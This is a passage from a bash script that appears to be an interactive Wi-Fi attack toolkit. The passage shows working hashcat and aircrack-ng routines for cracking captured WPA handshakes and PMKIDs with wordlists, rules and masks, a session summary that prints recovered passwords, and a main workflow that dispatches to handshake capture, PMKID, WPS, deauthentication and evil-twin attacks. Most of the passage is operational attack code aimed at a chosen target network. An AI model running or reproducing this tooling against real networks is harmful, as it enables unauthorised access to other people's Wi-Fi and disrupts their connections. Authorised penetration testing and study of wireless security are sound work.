            hashcat_mask "$hash_file" "$hash_type"
            ;;
    esac
}

hashcat_dictionary() {
    local hash_file="$1"
    local hash_type="$2"
    
    for wordlist in "${WORDLISTS[@]}"; do
        echo -e "\n${CYAN}[*] Trying: $(basename "$wordlist")${NC}"
        
        hashcat -m "$hash_type" -a 0 "$hash_file" "$wordlist" \
            --potfile-path="$SESSION_DIR/results/hashcat.pot" \
            -o "$SESSION_DIR/results/hashcat_found.txt" | \
            tee "$SESSION_DIR/results/hashcat_$(basename "$wordlist").log"
        
        if [ -f "$SESSION_DIR/results/hashcat_found.txt" ]; then
            echo -e "${GREEN}[+] PASSWORD FOUND!${NC}"
            cat "$SESSION_DIR/results/hashcat_found.txt"
            log_action "Password found with hashcat"
            return 0
        fi
    done
}

hashcat_rules() {
    local hash_file="$1"
    local hash_type="$2"
    
    echo -e "${YELLOW}[*] Using best64.rule${NC}"
    
    for wordlist in "${WORDLISTS[@]}"; do
        hashcat -m "$hash_type" -a 0 "$hash_file" "$wordlist" \
            -r /usr/share/hashcat/rules/best64.rule \
            --potfile-path="$SESSION_DIR/results/hashcat.pot" \
            -o "$SESSION_DIR/results/hashcat_found.txt"
        
        if [ -f "$SESSION_DIR/results/hashcat_found.txt" ]; then
            echo -e "${GREEN}[+] PASSWORD FOUND!${NC}"
            cat "$SESSION_DIR/results/hashcat_found.txt"
            return 0
        fi
    done
}

hashcat_combinator() {
    local hash_file="$1"
    local hash_type="$2"
    
    if [ ${#WORDLISTS[@]} -lt 2 ]; then
        echo -e "${RED}[!] Need at least 2 wordlists for combinator attack${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}[*] Combining wordlists...${NC}"
    hashcat -m "$hash_type" -a 1 "$hash_file" "${WORDLISTS[0]}" "${WORDLISTS[1]}" \
        --potfile-path="$SESSION_DIR/results/hashcat.pot" \
        -o "$SESSION_DIR/results/hashcat_found.txt"
}

hashcat_mask() {
    local hash_file="$1"
    local hash_type="$2"
    
    echo -e "${YELLOW}[*] Common mask patterns:${NC}"
    echo -e "  ${GREEN}[1]${NC} ?d?d?d?d?d?d?d?d (8 digits)"
    echo -e "  ${GREEN}[2]${NC} ?l?l?l?l?l?l?l?l (8 lowercase)"
    echo -e "  ${GREEN}[3]${NC} ?u?l?l?l?l?l?d?d (Capitalletter123)"
    echo -e "  ${GREEN}[4]${NC} Custom mask"
    read -p "Select [1-4]: " mask_choice
    
    local mask=""
    case $mask_choice in
        1) mask="?d?d?d?d?d?d?d?d" ;;
        2) mask="?l?l?l?l?l?l?l?l" ;;
        3) mask="?u?l?l?l?l?l?d?d" ;;
        4)
            read -p "Enter custom mask: " mask
            ;;
    esac
    
    echo -e "${CYAN}[*] Running mask attack: $mask${NC}"
    hashcat -m "$hash_type" -a 3 "$hash_file" "$mask" \
        --potfile-path="$SESSION_DIR/results/hashcat.pot" \
        -o "$SESSION_DIR/results/hashcat_found.txt"
}

compare_wordlists() {
    local hash_file="$1"
    local hash_type="$2"
    
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║         WORDLIST COMPARISON ANALYSIS                   ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${YELLOW}[*] Testing all wordlists to compare effectiveness...${NC}\n"
    
    # Results table
    echo -e "${CYAN}Wordlist                      Size      Time    Result${NC}"
    echo -e "${CYAN}----------------------------  --------  ------  ------${NC}"
    
    local results_file="$SESSION_DIR/results/wordlist_comparison.txt"
    echo "Wordlist Comparison Results" > "$results_file"
    echo "Target: $TARGET_ESSID ($TARGET_BSSID)" >> "$results_file"
    echo "Date: $(date)" >> "$results_file"
    echo "" >> "$results_file"
    
    for wordlist in "${WORDLISTS[@]}"; do
        local wl_name=$(basename "$wordlist")
        local wl_size=$(wc -l < "$wordlist" 2>/dev/null || echo "0")
        local wl_size_fmt=$(printf "%'d" $wl_size)
        
        echo -e "${YELLOW}[*] Testing: $wl_name${NC}"
        
        local start=$(date +%s)
        
        # Try with aircrack
        timeout 300 aircrack-ng "$hash_file" -w "$wordlist" -b "$TARGET_BSSID" \
            > "$SESSION_DIR/results/compare_${wl_name}.log" 2>&1
        
        local end=$(date +%s)
        local elapsed=$((end - start))
        
        local result="Not found"
        local result_color=$RED
        
        if grep -q "KEY FOUND" "$SESSION_DIR/results/compare_${wl_name}.log"; then
            result="FOUND"
            result_color=$GREEN
        fi
        
        printf "%-30s %-9s %-7s ${result_color}%-10s${NC}\n" \
            "$wl_name" "$wl_size_fmt" "${elapsed}s" "$result"
        
        echo "$wl_name | $wl_size_fmt passwords | ${elapsed}s | $result" >> "$results_file"
        
        if [ "$result" = "FOUND" ]; then
            break
        fi
    done
    
    echo -e "\n${GREEN}[+] Comparison results saved to:${NC}"
    echo -e "    ${CYAN}$results_file${NC}\n"
    
    log_action "Wordlist comparison completed"
}

################################################################################
# SESSION SUMMARY
################################################################################

show_session_summary() {
    local end_time=$(date +%s)
    local elapsed=$((end_time - START_TIME))
    local hours=$((elapsed / 3600))
    local minutes=$(((elapsed % 3600) / 60))
    local seconds=$((elapsed % 60))
    
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║              SESSION SUMMARY                           ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${CYAN}Target Network:${NC}"
    echo -e "  ESSID:      $TARGET_ESSID"
    echo -e "  BSSID:      $TARGET_BSSID"
    echo -e "  Channel:    $TARGET_CHANNEL"
    echo -e "  Encryption: $TARGET_ENC"
    echo ""
    
    echo -e "${CYAN}Attack Results:${NC}"
    [ "$HANDSHAKE_CAPTURED" = true ] && echo -e "  ${GREEN}✓${NC} Handshake captured" || echo -e "  ${RED}✗${NC} Handshake not captured"
    [ "$PMKID_CAPTURED" = true ] && echo -e "  ${GREEN}✓${NC} PMKID captured" || echo -e "  ${RED}✗${NC} PMKID not captured"
    [ "$WPS_SUCCESS" = true ] && echo -e "  ${GREEN}✓${NC} WPS successful" || echo -e "  ${RED}✗${NC} WPS not successful"
    echo ""
    
    echo -e "${CYAN}Statistics:${NC}"
    echo -e "  Session time: ${hours}h ${minutes}m ${seconds}s"
    echo -e "  Passwords tested: $(printf "%'d" $PASSWORDS_TESTED)"
    echo ""
    
    echo -e "${CYAN}Files saved to:${NC}"
    echo -e "  ${GREEN}$SESSION_DIR${NC}"
    echo ""
    
    # Check if password was found
    if [ -f "$SESSION_DIR/results/password.txt" ]; then
        echo -e "${GREEN}╔════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                PASSWORD RECOVERED!                     ║${NC}"
        echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
        cat "$SESSION_DIR/results/password.txt"
        echo ""
    fi
    
    # List all result files
    if [ -d "$SESSION_DIR/results" ] && [ "$(ls -A $SESSION_DIR/results)" ]; then
        echo -e "${CYAN}Result files:${NC}"
        ls -lh "$SESSION_DIR/results/" | tail -n +2 | awk '{printf "  %s (%s)\n", $9, $5}'
        echo ""
    fi
}

################################################################################
# MAIN WORKFLOW
################################################################################

main_workflow() {
    show_banner
    show_legal_warning
    check_dependencies
    create_session_dir
    
    # Interface setup
    select_interface
    enable_monitor_mode
    
    # Network scanning
    if ! scan_networks; then
        echo -e "${RED}[!] Failed to find networks${NC}"
        cleanup
    fi
    
    select_target
    
    # Attack selection
    show_attack_menu
    
    if [ "$ATTACK_MODE" = "handshake_capture" ]; then
        attack_handshake_capture
    elif [ "$ATTACK_MODE" = "pmkid_attack" ]; then
        attack_pmkid
    elif [ "$ATTACK_MODE" = "wps_attack" ]; then
        attack_wps
    elif [ "$ATTACK_MODE" = "deauth_attack" ]; then
        attack_deauth
    elif [ "$ATTACK_MODE" = "evil_twin" ]; then
        attack_evil_twin
    elif [ "$ATTACK_MODE" = "automated_crack" ]; then
        attack_automated
    fi
    
    # Password cracking
    if [ "$HANDSHAKE_CAPTURED" = true ] || [ "$PMKID_CAPTURED" = true ]; then
        echo -e "\n${YELLOW}[?] Proceed with password cracking?${NC}"
        read -p "[Y/n]: " crack_choice
        
        if [[ ! "$crack_choice" =~ ^[Nn]$ ]]; then
            setup_wordlists
            crack_with_wordlists
        fi
    fi
    
    cleanup
}

# Entry point
check_root
main_workflow
